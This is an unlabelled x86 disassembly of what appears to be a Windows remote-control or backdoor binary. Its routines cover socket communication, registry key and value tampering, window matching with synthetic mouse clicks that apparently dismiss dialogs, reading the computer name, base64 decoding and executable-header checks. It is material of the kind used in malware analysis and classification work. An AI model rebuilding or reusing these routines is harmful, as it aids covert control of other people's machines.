xor eax eax
pop ebx
add esp 0x10
retn
push ebx
mov [ esp + 0x10 ] 0x2
call [ Ordinal_WSOCK32_9@IAT ]
mov [ esp + 0xe ] ax
lea eax [ esp + 0xc ]
push 0x10
push eax
push esi
mov [ esp + 0x1c ] edi
call [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
add esp 0x10
retn
push esi
call [ Ordinal_WSOCK32_3@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x10
retn
push rw-data
call [ Ordinal_WSOCK32_10@IAT ]
mov ebx [ rw-data ]
mov edi eax
sub_4074c0
mov ecx [ esp + 0x4 ]
sub esp 0x10
lea eax [ esp ]
push 0x0
push 0x4
push eax
push ecx
call [ Ordinal_WSOCK32_16@IAT ]
cmp eax 0x4
je r-xdata
mov eax [ esp ]
add esp 0x10
retn
or eax 0xffffffff
add esp 0x10
retn
sub_4074f0
push ecx
push esi
push edi
push 0x3e800
mov esi 0x5
call sub_408e82
mov edi eax
add esp 0x4
test edi edi
je r-xdata
lea ecx [ esp + 0x8 ]
lea eax [ edi + 0x5 ]
push ecx
lea edx [ esi - 0x5 ]
push eax
push edx
push eax
mov [ edi + 0x1 ] esi
call sub_403b30
push esi
push edi
call sub_403320
push edi
call sub_4091a9
add esp 0x1c
pop edi
pop esi
pop ecx
retn
lea eax [ edi + 0x5 ]
mov [ edi ] 0x61
push eax
mov eax [ rw-data ]
mov edx [ eax ]
lea ecx [ eax + 0x4 ]
push ecx
push edx
call sub_4076a0
lea esi [ eax + 0x5 ]
mov [ esp + 0x14 ] eax
mov [ edi + esi ] 0x1
inc esi
lea eax [ edi + esi ]
push eax
mov eax [ rw-data ]
mov edx [ eax ]
lea ecx [ eax + 0x4 ]
push ecx
push edx
call sub_407720
add esp 0x18
mov [ esp + 0x8 ] eax
add esi eax
sub_407580
push esi
mov esi [ rw-data ]
push edi
or ecx 0xffffffff
lea edx [ esi + 0x4 ]
xor eax eax
mov edi edx
[ edi ]
not ecx
dec ecx
lea eax [ ecx + edx + 0x1 ]
push eax
mov eax [ esi ]
push edx
push eax
call sub_4078e0
add esp 0xc
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
call sub_405560
pop edi
pop esi
retn
sub_4075c0
push ebx
mov ebx [ rw-data ]
push esi
push edi
lea edx [ ebx + 0x4 ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
dec ecx
lea esi [ ecx + edx + 0x1 ]
or ecx 0xffffffff
mov edi esi
[ edi ]
not ecx
dec ecx
lea eax [ ecx + esi + 0x1 ]
mov ecx [ ecx + esi + 0x5 ]
push ecx
lea ecx [ eax + 0x8 ]
mov eax [ eax ]
push ecx
mov ecx [ ebx ]
push eax
push esi
push edx
push ecx
call sub_407880
add esp 0x18
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
call sub_405560
pop edi
pop esi
pop ebx
retn
sub_407620
push esi
mov esi [ rw-data ]
push edi
or ecx 0xffffffff
lea edx [ esi + 0x4 ]
xor eax eax
mov edi edx
[ edi ]
not ecx
dec ecx
lea eax [ ecx + edx + 0x1 ]
push eax
mov eax [ esi ]
push edx
push eax
call sub_4077c0
add esp 0xc
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
call sub_405560
pop edi
pop esi
retn
sub_407660
push esi
mov esi [ rw-data ]
push edi
or ecx 0xffffffff
lea edx [ esi + 0x4 ]
xor eax eax
mov edi edx
[ edi ]
not ecx
dec ecx
lea eax [ ecx + edx + 0x1 ]
push eax
mov eax [ esi ]
push edx
push eax
call sub_407830
add esp 0xc
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
call sub_405560
pop edi
pop esi
retn
sub_4076a0
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push ebx
lea eax [ esp + 0xc ]
push esi
xor esi esi
push eax
push 0xf003f
push esi
push ecx
push edx
xor ebx ebx
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
push ebp
mov ebp [ esp + 0x18 ]
push edi
pop esi
xor eax eax
pop ebx
retn
mov edx [ esp + 0x18 ]
push edx
call [ RegCloseKey@IAT ]
pop edi
mov eax esi
pop ebp
pop esi
pop ebx
retn
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
inc ebx
lea esi [ esi + ecx + 0x1 ]
jmp r-xdata
mov ecx [ esp + 0x18 ]
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x20 ]
lea edi [ esi + ebp ]
push 0x0
push eax
push edi
push ebx
push ecx
mov [ esp + 0x34 ] 0x104
call [ RegEnumKeyExA@IAT ]
test eax eax
jne r-xdata
sub_407720
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push ebx
lea eax [ esp + 0x8 ]
push esi
xor esi esi
push eax
push 0xf003f
push esi
push ecx
push edx
xor ebx ebx
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
push ebp
mov ebp [ RegEnumValueA@IAT ]
push edi
mov edi [ esp + 0x1c ]
pop esi
xor eax eax
pop ebx
retn
mov edx [ esp + 0x14 ]
push edx
call [ RegCloseKey@IAT ]
pop edi
mov eax esi
pop ebp
pop esi
pop ebx
retn
mov eax [ esp + 0x18 ]
inc ebx
mov [ esi + edi + 0x104 ] eax
mov ecx [ esp + 0x18 ]
lea esi [ esi + ecx + 0x108 ]
jmp r-xdata
lea eax [ esp + 0x18 ]
lea ecx [ edi + esi + 0x108 ]
push eax
lea edx [ edi + esi + 0x100 ]
push ecx
push edx
mov edx [ esp + 0x20 ]
lea eax [ esp + 0x28 ]
push 0x0
lea ecx [ esi + edi ]
push eax
push ecx
push ebx
push edx
mov [ esp + 0x3c ] 0x100
mov [ esp + 0x38 ] 0x2800
call ebp
test eax eax
jne r-xdata
sub_4077c0
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
sub esp 0x20
lea eax [ esp + 0x28 ]
push eax
push 0xf003f
push 0x0
push ecx
push edx
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x2c ]
mov ecx [ esp + 0x28 ]
push esi
push eax
push ecx
call [ SHDeleteKeyA@IAT ]
mov esi eax
lea edx [ esp + 0x4 ]
push esi
push rw-data
push edx
call sub_409157
mov eax [ esp + 0x38 ]
add esp 0xc
push eax
call [ RegCloseKey@IAT ]
xor eax eax
test esi esi
sete al
pop esi
add esp 0x20
retn
xor eax eax
add esp 0x20
retn
sub_407830
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
lea eax [ esp + 0x8 ]
push eax
push 0xf003f
push 0x0
push ecx
push edx
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
push esi
push eax
push ecx
call [ RegDeleteValueA@IAT ]
mov edx [ esp + 0xc ]
mov esi eax
push edx
call [ RegCloseKey@IAT ]
xor eax eax
test esi esi
sete al
pop esi
retn
xor eax eax
retn
sub_407880
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
lea eax [ esp + 0x8 ]
push eax
push 0xf003f
push 0x0
push ecx
push edx
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
push esi
push eax
mov eax [ esp + 0x14 ]
push ecx
mov ecx [ esp + 0x14 ]
push edx
push 0x0
push eax
push ecx
call [ RegSetValueExA@IAT ]
mov edx [ esp + 0xc ]
mov esi eax
push edx
call [ RegCloseKey@IAT ]
xor eax eax
test esi esi
sete al
pop esi
retn
xor eax eax
retn
sub_4078e0
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
lea eax [ esp + 0x8 ]
push eax
push 0xf003f
push 0x0
push ecx
push edx
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
mov ecx [ esp + 0xc ]
push esi
mov edx [ esp + 0xc ]
push edi
lea eax [ esp + 0xc ]
push 0x0
push eax
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
push ecx
push edx
call [ RegCreateKeyExA@IAT ]
mov edi [ RegCloseKey@IAT ]
mov esi eax
mov eax [ esp + 0x10 ]
push eax
call edi
mov ecx [ esp + 0xc ]
push ecx
call edi
xor eax eax
pop edi
test esi esi
sete al
pop esi
retn
xor eax eax
retn
sub_407950
push ecx
cmp [ rw-data ] 0x2
jne r-xdata
pop ecx
retn
lea eax [ esp ]
mov [ esp ] 0x0
push eax
push 0x0
push 0x0
call NetGetDCName
test eax eax
jne r-xdata
mov [ rw-data ] 0x0
mov ecx [ esp ]
push ecx
push rw-data
push rw-data
call sub_409157
add esp 0xc
jmp r-xdata
push eax
call NetApiBufferFree
mov eax [ esp ]
test eax eax
je r-xdata
sub_4079b0
mov eax [ rw-data ]
test eax eax
jne r-xdata
xor eax eax
retn 0x4
push ebx
mov ebx [ Sleep@IAT ]
push esi
mov esi [ GetWindow@IAT ]
push edi
mov edi [ GetForegroundWindow@IAT ]
push 0x0
call edi
push eax
call esi
push eax
call sub_407a00
add esp 0x4
push 0xa
call ebx
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn 0x4
sub_407a00
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push edi
mov edi [ GetWindow@IAT ]
push 0x5
push esi
call edi
push eax
call sub_407a00
add esp 0x4
push 0x2
push esi
call edi
mov esi eax
test esi esi
jne r-xdata
push esi
call sub_407cc0
add esp 0x4
push esi
call sub_407a50
add esp 0x4
test eax eax
je r-xdata
pop edi
sub_407a50
sub esp 0x500
mov al [ rw-data ]
push ebx
push ebp
push esi
push edi
mov [ esp + 0x10 ] al
mov ecx 0x1f
xor eax eax
lea edi [ esp + 0x11 ]
mov ebp [ esp + 0x514 ]
[ edi ]
stosw [ edi ]
lea ecx [ esp + 0x10 ]
push 0x80
push ecx
push ebp
stosb [ edi ]
call [ GetClassNameA@IAT ]
mov ebx [ GetWindowTextA@IAT ]
xor edi edi
mov [ rw-data ] edi
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
inc edi
cmp edi 0x28
mov [ rw-data ] edi
jge r-xdata
mov al [ rw-data ]
mov ecx 0x7f
mov [ esp + 0x90 ] al
xor eax eax
lea edi [ esp + 0x91 ]
push 0x200
[ edi ]
stosw [ edi ]
lea ecx [ esp + 0x94 ]
push ecx
push ebp
stosb [ edi ]
call ebx
mov edi [ rw-data ]
mov edx edi
shl edx 0x6
add edx edi
lea eax [ edi + edx * 2 ]
shl eax 0x2
mov ecx [ eax + rw-data ]
test ecx ecx
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x500
retn
jmp r-xdata
mov ecx edi
shl ecx 0x6
add ecx edi
lea edx [ edi + ecx * 2 ]
mov eax [ edx * 4 + rw-data ]
test eax eax
je r-xdata
mov ecx [ eax + rw-data ]
test ecx ecx
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov edx edi
shl edx 0x6
add edx edi
lea eax [ edi + edx * 2 ]
lea esi [ eax * 4 + rw-data ]
lea eax [ esp + 0x10 ]
push rw-data
push ebp
call [ GetWindowRect@IAT ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push ecx
push edx
lea ecx [ esp + 0xa0 ]
push eax
mov eax [ rw-data ]
lea edx [ esp + 0x24 ]
push ecx
push edx
push ebp
push eax
lea ecx [ esp + 0x2b4 ]
push rw-data
push ecx
call sub_409157
mov eax 0xa
add esp 0x2c
mov [ rw-data ] eax
mov [ rw-data ] eax
mov esi rw-data
lea eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x500
retn
lea edx [ eax + rw-data ]
lea eax [ esp + 0x90 ]
push edx
push eax
call sub_4093b0
mov edi [ rw-data ]
add esp 0x8
lea esi [ eax + rw-data ]
lea eax [ esp + 0x90 ]
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
sbb eax eax
sbb eax 0xffffffff
xor ecx ecx
test eax eax
sete cl
mov eax ecx
jmp r-xdata
test cl cl
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x500
retn
mov eax [ rw-data ]
mov edx [ rw-data ]
sub eax edx
cmp eax 0x12c
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
test eax eax
jne r-xdata
xor eax eax
xor ecx ecx
test eax eax
sete cl
mov eax ecx
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov [ rw-data ] 0xb5
mov [ rw-data ] 0x35
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sub_407cc0
mov eax [ rw-data ]
push esi
mov ecx eax
shl ecx 0x6
add ecx eax
lea edx [ eax + ecx * 2 ]
mov eax [ edx * 4 + rw-data ]
test eax eax
je r-xdata
push ebx
call sub_407d70
mov eax [ rw-data ]
mov esi rw-data
mov ecx eax
shl ecx 0x6
add ecx eax
lea edx [ eax + ecx * 2 ]
lea eax [ edx * 4 + rw-data ]
mov esi [ esp + 0x8 ]
push edi
mov edi [ SendMessageA@IAT ]
push 0xa0005
push 0x0
push 0x201
push esi
call edi
push 0xa0005
push 0x0
push 0x202
push esi
call edi
pop edi
pop esi
retn
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
pop esi
retn
sub [ rw-data ] 0x14
call sub_407d70
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
test eax eax
pop ebx
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
sub_407d70
push ebx
push ebp
push esi
push edi
mov edi [ GetSystemMetrics@IAT ]
push 0x0
call edi
mov ecx eax
mov eax 0xffff
cdq
dec ecx
push 0x1
idiv ecx
mov esi eax
call edi
mov ecx eax
mov eax 0xffff
cdq
dec ecx
mov ebp [ rw-data ]
idiv ecx
mov edx [ rw-data ]
push 0x0
sub edx ebp
push 0x0
mov ebx [ mouse_event@IAT ]
mov edi eax
mov eax [ rw-data ]
imul edx edi
push edx
mov edx [ rw-data ]
sub eax edx
imul eax esi
push eax
push 0x8001
call ebx
mov ebp [ Sleep@IAT ]
push 0x28
call ebp
mov ecx [ rw-data ]
mov eax [ rw-data ]
sub ecx eax
mov edx [ rw-data ]
imul ecx edi
push 0x0
push 0x0
push ecx
mov ecx [ rw-data ]
sub edx ecx
imul edx esi
push edx
push 0x8002
call ebx
push 0x28
call ebp
mov eax [ rw-data ]
mov ecx [ rw-data ]
sub eax ecx
mov ecx [ rw-data ]
imul eax edi
mov edi [ rw-data ]
push 0x0
sub ecx edi
push 0x0
imul ecx esi
push eax
push ecx
push 0x8004
call ebx
pop edi
pop esi
pop ebp
pop ebx
retn
sub_407e40
mov eax [ esp + 0x4 ]
push esi
push rw-data
push eax
call sub_409797
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
push edi
mov edi 0x1
push esi
push edi
lea ecx [ esp + 0x14 ]
push edi
push ecx
call sub_409603
add esp 0x10
test eax eax
je r-xdata
pop esi
retn
push esi
call sub_4095ad
add esp 0x4
mov eax edi
pop edi
pop esi
retn
movsx edx [ esp + 0xc ]
push edx
call sub_409923
add esp 0x4
test eax eax
jne r-xdata
push esi
push 0x1
lea ecx [ esp + 0x14 ]
push 0x1
push ecx
call sub_409603
add esp 0x10
test eax eax
je r-xdata
movsx eax [ esp + 0xc ]
push eax
call sub_409951
add esp 0x4
test eax eax
jne r-xdata
jmp r-xdata
mov al [ esp + 0xc ]
cmp al 0x2b
je r-xdata
cmp al 0x2f
je r-xdata
cmp al 0x3d
je r-xdata
cmp al 0xd
je r-xdata
cmp al 0xa
jne r-xdata
xor edi edi
sub_407ee0
sub esp 0x110
push ebx
mov ebx 0xff
push ebp
push esi
push edi
mov [ esp + 0x18 ] bl
mov [ esp + 0x19 ] bl
mov [ esp + 0x1a ] bl
mov [ esp + 0x1b ] bl
mov [ esp + 0x1c ] bl
mov [ esp + 0x1d ] bl
mov [ esp + 0x1e ] bl
mov [ esp + 0x1f ] bl
mov [ esp + 0x20 ] bl
mov [ esp + 0x21 ] bl
mov [ esp + 0x22 ] bl
mov [ esp + 0x23 ] bl
mov [ esp + 0x24 ] bl
mov [ esp + 0x25 ] bl
mov [ esp + 0x26 ] bl
mov [ esp + 0x27 ] bl
mov [ esp + 0x28 ] bl
mov [ esp + 0x29 ] bl
mov [ esp + 0x2a ] bl
mov [ esp + 0x2b ] bl
mov [ esp + 0x2c ] bl
mov [ esp + 0x2d ] bl
mov [ esp + 0x2e ] bl
mov [ esp + 0x2f ] bl
mov [ esp + 0x30 ] bl
mov [ esp + 0x31 ] bl
mov [ esp + 0x32 ] bl
mov [ esp + 0x33 ] bl
mov [ esp + 0x34 ] bl
mov [ esp + 0x35 ] bl
mov [ esp + 0x36 ] bl
mov [ esp + 0x37 ] bl
mov [ esp + 0x38 ] bl
mov [ esp + 0x39 ] bl
mov [ esp + 0x3a ] bl
mov [ esp + 0x3b ] bl
mov [ esp + 0x3c ] bl
mov [ esp + 0x3d ] bl
mov [ esp + 0x3e ] bl
mov [ esp + 0x3f ] bl
mov [ esp + 0x40 ] bl
mov [ esp + 0x41 ] bl
mov [ esp + 0x42 ] bl
mov [ esp + 0x43 ] 0x3e
mov [ esp + 0x44 ] bl
mov [ esp + 0x45 ] bl
mov [ esp + 0x46 ] bl
mov [ esp + 0x47 ] 0x3f
mov [ esp + 0x48 ] 0x34
mov [ esp + 0x49 ] 0x35
mov [ esp + 0x4a ] 0x36
mov [ esp + 0x4b ] 0x37
mov [ esp + 0x4c ] 0x38
mov [ esp + 0x4d ] 0x39
mov [ esp + 0x4e ] 0x3a
mov [ esp + 0x4f ] 0x3b
mov [ esp + 0x50 ] 0x3c
mov [ esp + 0x51 ] 0x3d
mov [ esp + 0x52 ] bl
mov [ esp + 0x53 ] bl
mov [ esp + 0x54 ] bl
mov [ esp + 0x55 ] bl
mov [ esp + 0x56 ] bl
mov [ esp + 0x57 ] bl
mov [ esp + 0x58 ] bl
mov [ esp + 0x59 ] 0x0
mov [ esp + 0x5a ] 0x1
mov [ esp + 0x5b ] 0x2
mov [ esp + 0x5c ] 0x3
mov [ esp + 0x5d ] 0x4
mov [ esp + 0x5e ] 0x5
mov [ esp + 0x5f ] 0x6
mov [ esp + 0x60 ] 0x7
mov [ esp + 0x61 ] 0x8
mov [ esp + 0x62 ] 0x9
mov [ esp + 0x63 ] 0xa
mov [ esp + 0x64 ] 0xb
mov [ esp + 0x65 ] 0xc
mov [ esp + 0x66 ] 0xd
mov [ esp + 0x67 ] 0xe
mov [ esp + 0x68 ] 0xf
mov [ esp + 0x69 ] 0x10
mov [ esp + 0x6a ] 0x11
mov [ esp + 0x6b ] 0x12
mov [ esp + 0x6c ] 0x13
mov [ esp + 0x6d ] 0x14
mov [ esp + 0x6e ] 0x15
mov [ esp + 0x6f ] 0x16
mov [ esp + 0x70 ] 0x17
mov [ esp + 0x71 ] 0x18
mov [ esp + 0x72 ] 0x19
mov [ esp + 0x73 ] bl
mov [ esp + 0x74 ] bl
mov [ esp + 0x75 ] bl
mov [ esp + 0x76 ] bl
mov [ esp + 0x77 ] bl
mov [ esp + 0x78 ] bl
mov [ esp + 0x79 ] 0x1a
mov [ esp + 0x7a ] 0x1b
mov [ esp + 0x7b ] 0x1c
mov [ esp + 0x7c ] 0x1d
mov [ esp + 0x7d ] 0x1e
mov [ esp + 0x7e ] 0x1f
mov [ esp + 0x7f ] 0x20
mov [ esp + 0x80 ] 0x21
mov [ esp + 0x81 ] 0x22
mov [ esp + 0x82 ] 0x23
mov [ esp + 0x83 ] 0x24
mov [ esp + 0x84 ] 0x25
mov [ esp + 0x85 ] 0x26
mov [ esp + 0x86 ] 0x27
mov [ esp + 0x87 ] 0x28
mov [ esp + 0x88 ] 0x29
mov [ esp + 0x89 ] 0x2a
mov [ esp + 0x8a ] 0x2b
mov [ esp + 0x8b ] 0x2c
mov [ esp + 0x8c ] 0x2d
mov [ esp + 0x8d ] 0x2e
mov [ esp + 0x8e ] 0x2f
mov [ esp + 0x8f ] 0x30
mov [ esp + 0x90 ] 0x31
mov [ esp + 0x91 ] 0x32
mov [ esp + 0x92 ] 0x33
mov [ esp + 0x93 ] bl
mov [ esp + 0x94 ] bl
mov [ esp + 0x95 ] bl
mov [ esp + 0x96 ] bl
mov [ esp + 0x97 ] bl
mov [ esp + 0x98 ] bl
mov [ esp + 0x99 ] bl
mov [ esp + 0x9a ] bl
mov [ esp + 0x9b ] bl
mov [ esp + 0x9c ] bl
mov [ esp + 0x9d ] bl
mov [ esp + 0x9e ] bl
mov [ esp + 0x9f ] bl
mov [ esp + 0xa0 ] bl
mov [ esp + 0xa1 ] bl
mov [ esp + 0xa2 ] bl
mov [ esp + 0xa3 ] bl
mov [ esp + 0xa4 ] bl
mov [ esp + 0xa5 ] bl
mov [ esp + 0xa6 ] bl
mov [ esp + 0xa7 ] bl
mov [ esp + 0xa8 ] bl
mov [ esp + 0xa9 ] bl
mov [ esp + 0xaa ] bl
mov [ esp + 0xab ] bl
mov [ esp + 0xac ] bl
mov [ esp + 0xad ] bl
mov [ esp + 0xae ] bl
mov [ esp + 0xaf ] bl
mov [ esp + 0xb0 ] bl
mov [ esp + 0xb1 ] bl
mov [ esp + 0xb2 ] bl
mov [ esp + 0xb3 ] bl
mov [ esp + 0xb4 ] bl
mov [ esp + 0xb5 ] bl
mov [ esp + 0xb6 ] bl
mov [ esp + 0xb7 ] bl
mov [ esp + 0xb8 ] bl
mov [ esp + 0xb9 ] bl
mov [ esp + 0xba ] bl
mov [ esp + 0xbb ] bl
mov [ esp + 0xbc ] bl
mov [ esp + 0xbd ] bl
mov [ esp + 0xbe ] bl
mov [ esp + 0xbf ] bl
mov [ esp + 0xc0 ] bl
mov [ esp + 0xc1 ] bl
mov [ esp + 0xc2 ] bl
mov [ esp + 0xc3 ] bl
mov [ esp + 0xc4 ] bl
mov [ esp + 0xc5 ] bl
mov [ esp + 0xc6 ] bl
mov [ esp + 0xc7 ] bl
mov [ esp + 0xc8 ] bl
mov [ esp + 0xc9 ] bl
mov [ esp + 0xca ] bl
mov [ esp + 0xcb ] bl
mov [ esp + 0xcc ] bl
mov [ esp + 0xcd ] bl
mov [ esp + 0xce ] bl
mov [ esp + 0xcf ] bl
mov [ esp + 0xd0 ] bl
mov [ esp + 0xd1 ] bl
mov [ esp + 0xd2 ] bl
mov [ esp + 0xd3 ] bl
mov [ esp + 0xd4 ] bl
mov [ esp + 0xd5 ] bl
mov [ esp + 0xd6 ] bl
mov [ esp + 0xd7 ] bl
mov [ esp + 0xd8 ] bl
mov [ esp + 0xd9 ] bl
mov [ esp + 0xda ] bl
mov [ esp + 0xdb ] bl
mov [ esp + 0xdc ] bl
mov [ esp + 0xdd ] bl
mov [ esp + 0xde ] bl
mov [ esp + 0xdf ] bl
mov [ esp + 0xe0 ] bl
mov [ esp + 0xe1 ] bl
mov [ esp + 0xe2 ] bl
mov [ esp + 0xe3 ] bl
mov [ esp + 0xe4 ] bl
mov [ esp + 0xe5 ] bl
mov [ esp + 0xe6 ] bl
mov [ esp + 0xe7 ] bl
mov [ esp + 0xe8 ] bl
mov [ esp + 0xe9 ] bl
mov [ esp + 0xea ] bl
mov [ esp + 0xeb ] bl
mov [ esp + 0xec ] bl
mov [ esp + 0xed ] bl
mov [ esp + 0xee ] bl
mov [ esp + 0xef ] bl
mov [ esp + 0xf0 ] bl
mov [ esp + 0xf1 ] bl
mov [ esp + 0xf2 ] bl
mov [ esp + 0xf3 ] bl
mov [ esp + 0xf4 ] bl
mov [ esp + 0xf5 ] bl
mov [ esp + 0xf6 ] bl
mov [ esp + 0xf7 ] bl
mov [ esp + 0xf8 ] bl
mov [ esp + 0xf9 ] bl
mov [ esp + 0xfa ] bl
mov [ esp + 0xfb ] bl
mov [ esp + 0xfc ] bl
mov [ esp + 0xfd ] bl
mov [ esp + 0xfe ] bl
mov [ esp + 0xff ] bl
mov [ esp + 0x100 ] bl
mov [ esp + 0x101 ] bl
mov [ esp + 0x102 ] bl
mov [ esp + 0x103 ] bl
mov [ esp + 0x104 ] bl
mov [ esp + 0x105 ] bl
mov eax [ esp + 0x124 ]
push rw-data
push eax
mov [ esp + 0x10e ] bl
mov [ esp + 0x10f ] bl
mov [ esp + 0x110 ] bl
mov [ esp + 0x111 ] bl
mov [ esp + 0x112 ] bl
mov [ esp + 0x113 ] bl
mov [ esp + 0x114 ] bl
mov [ esp + 0x115 ] bl
mov [ esp + 0x116 ] bl
mov [ esp + 0x117 ] bl
mov [ esp + 0x118 ] bl
mov [ esp + 0x119 ] bl
mov [ esp + 0x11a ] bl
mov [ esp + 0x11b ] bl
mov [ esp + 0x11c ] bl
mov [ esp + 0x11d ] bl
mov [ esp + 0x11e ] bl
mov [ esp + 0x11f ] bl
call sub_409797
mov ecx [ esp + 0x130 ]
push rw-data
push ecx
mov esi eax
call sub_409797
xor edi edi
add esp 0x10
mov ebp eax
cmp esi edi
mov [ esp + 0x11c ] ebp
jne r-xdata
cmp ebp edi
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x110
retn
push esi
push 0x1
lea edx [ esp + 0x1c ]
push 0x1
push edx
mov [ esp + 0x128 ] edi
call sub_409603
add esp 0x10
test eax eax
je r-xdata
push esi
call sub_4095ad
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x110
retn
mov eax [ esp + 0x14 ]
mov eax [ esp + 0x14 ]
mov ecx eax
and ecx ebx
cmp [ esp + ecx + 0x18 ] bl
jne r-xdata
push esi
call sub_4095ad
push ebp
call sub_4095ad
add esp 0x8
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x110
retn
mov edx [ esp + 0x14 ]
and edx ebx
mov cl [ esp + edx + 0x18 ]
cmp cl bl
je r-xdata
and eax ebx
push esi
push 0x1
lea ecx [ esp + 0x1c ]
mov al [ esp + eax + 0x20 ]
push 0x1
push ecx
mov [ esp + 0x22 ] al
call sub_409603
add esp 0x10
test eax eax
je r-xdata
push esi
push 0x1
lea edx [ esp + 0x1c ]
push 0x1
push edx
call sub_409603
add esp 0x10
test eax eax
jne r-xdata
push esi
push 0x1
lea ecx [ esp + 0x1c ]
push 0x1
push ecx
call sub_409603
add esp 0x10
test eax eax
jne r-xdata
mov eax [ esp + 0x118 ]
xor edx edx
mov ebp 0x3
div ebp
test edx edx
jne r-xdata
mov ebp [ esp + 0x11c ]
cmp edx 0x1
jne r-xdata
test edi edi
je r-xdata
cmp edx 0x2
jne r-xdata
mov al [ esp + 0x12 ]
shr cl 0x2
shl al 0x4
or cl al
mov [ esp + 0x13 ] cl
jmp r-xdata
mov al [ esp + 0x12 ]
shr cl 0x4
shl al 0x2
or cl al
mov [ esp + 0x13 ] cl
jmp r-xdata
mov [ esp + 0x12 ] cl
xor edi edi
jmp r-xdata
mov eax [ esp + 0x11c ]
lea ecx [ esp + 0x13 ]
push eax
push 0x1
push 0x1
push ecx
call sub_4097aa
mov edx [ esp + 0x24 ]
add esp 0x10
and edx ebx
mov al [ esp + edx + 0x18 ]
mov [ esp + 0x12 ] al
mov eax [ esp + 0x118 ]
inc eax
mov [ esp + 0x118 ] eax
mov al [ esp + 0x12 ]
mov edi 0x1
shl al 0x6
or al cl
mov [ esp + 0x13 ] al
sub_4086b0
mov eax [ esp + 0x4 ]
push esi
push rw-data
push eax
call sub_409797
mov esi eax
add esp 0x8
test esi esi
je r-xdata
xor eax eax
pop esi
retn
push esi
push 0x2
lea ecx [ esp + 0x10 ]
push 0x1
push ecx
call sub_409603
push esi
call sub_4095ad
add esp 0x14
cmp [ esp + 0x8 ] 0x5a4d
jne r-xdata
mov eax 0x1
pop esi
retn
sub_408700
sub esp 0x8c
push ebx
push 0x3e800
call sub_408e82
mov ebx eax
add esp 0x4
test ebx ebx
jne r-xdata
mov ecx [ esp + 0x94 ]
lea eax [ esp + 0x4 ]
push 0x0
push eax
push ebx
push 0x0
push rw-data
push ecx
push 0x50
push rw-data
mov [ esp + 0x28 ] 0x0
call sub_402b30
add esp 0x20
test eax eax
jne r-xdata
pop ebx
add esp 0x8c
retn
mov edx [ esp + 0x4 ]
push ebp
push esi
lea eax [ esp + 0x14 ]
push edi
lea ecx [ esp + 0x1c ]
push eax
mov [ edx + ebx ] 0x0
push ecx
mov [ esp + 0x20 ] 0x80
call [ GetComputerNameA@IAT ]
mov edx [ esp + 0x10 ]
lea ebp [ ebx - 0x2 ]
add edx ebx
cmp ebp edx
jae r-xdata
push ebx
call sub_4091a9
add esp 0x4
xor eax eax
pop ebx
add esp 0x8c
retn
push ebx
call sub_4091a9
mov eax [ esp + 0x18 ]
add esp 0x4
